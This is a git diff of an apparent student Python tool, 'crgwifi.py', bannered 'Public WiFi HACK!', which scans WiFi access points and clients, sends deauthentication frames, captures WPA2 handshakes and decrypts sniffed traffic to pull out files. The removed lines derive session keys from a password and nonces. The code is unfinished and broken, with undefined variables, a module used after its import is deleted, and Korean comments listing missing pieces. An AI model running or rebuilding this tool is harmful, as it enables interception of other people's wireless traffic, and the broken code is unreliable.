@@ -1,11 +1,10 @@
 import sys
-import monCheck
-import scanner
 import texttable
 import time
-import wpa2decryption
-import binascii
-from datetime import datetime
+
+import monCheck
+import scanner
+import capture
 
 '''
 without argv: print help
@@ -21,9 +20,9 @@ extract mode: extract img/pdf/or something...
 -argv type: crgwifi.py -e abc.pcap
 '''
 
-
 def help():
-    print("""Public WiFi HACK!
+    print("""
+Public WiFi HACK!
 Usage:
   crgwifi.py -s
   crgwifi.py -e
@@ -35,13 +34,18 @@ Options:
   -c		Capture mode. When Authentication packet arrive, it automatically decrypt and save packets.
   -h --help     Show this screen.
   --version     Show version.""")
+  
+  
+if __name__== '__main__':
 
-
-if __name__ == '__main__':
-
+    #Prolog!
     isScannerActive = False
     isCaptureActive = False
     isExtracterActive = False
+
+    if len(sys.argv) < 2:
+        help()
+        exit()
 
     if sys.argv[1] == "-s":
         isScannerActive = True
@@ -50,38 +54,37 @@ if __name__ == '__main__':
     elif sys.argv[1] == "-e":
         isExtracterActive = True
 
+
     a = monCheck.MonitorCheck()
     iwName = a.iwName
     iwStatus = a.monitorStatus
-
+    
     if iwStatus != True:
         print("No Monitor interface Detected")
         sys.exit()
-
-    if len(sys.argv) < 2:
-        help()
-
-    elif isScannerActive == True:
-        # Init
+    
+    #Scanner Mode!
+    if isScannerActive == True:
         s = scanner.sniffmodule(iwName)
         print("[+] Scanner mode active")
-
+        
         # AP Scan Start
         sec = int(input(" [+] AP Scan - Set time to scan: "))
         result = s.AP_scanner(sec)
         if not result:
-            print(" [*] AP scan Failed...")
+            print(" [!] AP scan Failed...")
             sys.exit()
         time.sleep(1)
-
+        
         # Print Result as Table
-        AP = s.F_APs
-        ta = texttable.Texttable()
+        AP = s.F_APs     
+        ta= texttable.Texttable()
         ta.add_row(['id', 'SSID', 'mac'])
         for aps in AP:
             ta.add_row([aps.id, aps.ssid, aps.mac])
         print(ta.draw())
-
+            
+        
         # STA Scan Start    
         s.select_target()
         sec = int(input(" [+] STA Scan - Set time to scan: "))
@@ -89,91 +92,53 @@ if __name__ == '__main__':
         if not result2:
             print(" [*] STA scan Failed...")
             sys.exit()
-
+            
         # Print Result as Table
         STA = s.F_STAs
         ts = texttable.Texttable()
         ts.add_row(['id', 'mac'])
         for stas in STA:
-            ts.add_row([stas.id + 1, stas.mac])
+            ts.add_row([stas.id+1, stas.mac])
         print(ts.draw())
 
-        print("[+] Enter capture mode? Y/N")
-        IsCaptureActive = input()
-        IsCaptureActive.lower()
+        IsCaptureActive = input("[+] Enter capture mode(Y/N)? ").lower()
         while True:
-            try:
-                if IsCaptureActive == "y":
-                    isCaptureActive == True
-                    break
-                elif IsCaptureActive == "n":
-                    print("[+] Exit System")
-                    sys.exit()
-                else:
-                    continue
-            except:
-                print("[+] Error occured. please type again")
+            if IsCaptureActive == "y":
+                isCaptureActive = True
+                break
+            elif IsCaptureActive =="n":
+                print(" [+] Exit System")
+                sys.exit()
+            else:
+                print(" [!] Error occured. please type again")
                 continue
 
-
-
-    elif isCaptureActive == True:
+    #Capture Mode!
+    if isCaptureActive == True:
         print("[+] capture mode active")
 
         if isScannerActive == False:
             try:
-                ssid = input("Give me SSID : ")
-                pw = input("Give me PW : ")
-                ap_channel = int(input("Give me channel of target AP : "))
-                ap_mac = input("Give me AP mac address (ex. XX:XX:XX:XX:XX:XX) : ")
-                sta_mac = input("Give me STA mac address (ex. XX:XX:XX:XX:XX:XX) : ")
+                AP_MAC = sys.argv[2]
+                STA_MAC = sys.argv[3]
             except:
-                print("[+] Error occured: please enter accurate MAC Address")
-                
-        elif : 
-            # 위에서 값들 받아오는 코드
+                print("[+] MAC Error occured: please enter accurate MAC Address")
+                print("[+] AP MAC: ")
+                AP_MAC = input()
+                print("[+] STA MAC: ")
+                STA_MAC = input()
 
-        c = capture.capturemodule()
+""" 몇 번째 STA인지 받는 부분 없음.
 
-        c.capture4way(sta_mac, ap_mac, iwName, ap_channel, 10)
-        
-        anonce = c.F_nonces[0]
-        snonce = c.F_nonces[1]
+ssid 받아오는 부분 없음.
+"""
 
-        ap_mac = binascii.a2b_hex(ap_mac.replace(":", ""))
-        s_mac = binascii.a2b_hex(s_mac.replace(":", ""))
+        capturemodule = capture.Capturemodule(STA_MAC, AP_MAC, ssid, pw, iwName, SAVE_FOLDER)
+        capturemodule.deauth()
+        capturemodule.packet_sniff()
 
-        A, B = c.MakeAB(anonce, snonce, ap_mac, s_mac)
-        pmk = c.makePMK(PW, SSID)
-        ptk = c.makePTK(pmk, A, B)
-
-        #print(ptk)
-            
-        # 대충 캡처해서 저장하는 부분이 들어갈 위
-
-        # save file location
-        now = datetime.now()
-        TimeInfo = now.year + "_" + now.month + "_" + now.day + "_" + now.hour + "_" + now.minute
-        FileLocation = "./Capture_" + TimeInfo  # 세이브파일 형식은 캡처_현재시각의 형태, 요 위치에 저장하도록 코드 짜길 요망
-
-        IsExtracterActive = input("[+]Enter Extracter mode? Y/N: ")
-        IsExtracterActive.lower()
-        while True:
-            try:
-                if IsExtracterActive == "y":
-                    isExtracterActive == True
-                    break
-                elif IsExtracterActive == "n":
-                    print("[+] Exit System")
-                    sys.exit()
-                else:
-                    continue
-            except:
-                print("[+] Error occured. please type again")
-                continue
-
-
-    elif isExtracterActive == True:
+    #Extract Mode!
+    if isExtracterActive == True:
         print("[+] extract mode active")
         if isScannerActive == False:
             try:
@@ -182,14 +147,11 @@ if __name__ == '__main__':
                 print("[+] File Location Error: please type correct file location")
                 FileLocation = input("[+] File Location: ")
 
+        wpa2decryption.decrypt(FileLocation) # 파일 로케이션을 인자로 받아서 돌리게끔 함
 
-
-    elif sys.argv[1] == "-h":
+    
+    if sys.argv[1] == "-h":
         help()
-
-    else:
-        print("[+] invalid operation: ", sys.argv[1])
-        print("[+] try crgwifi.py -h to view more help")
 
 '''except:
     print("unknown error detected: process ceased")'''
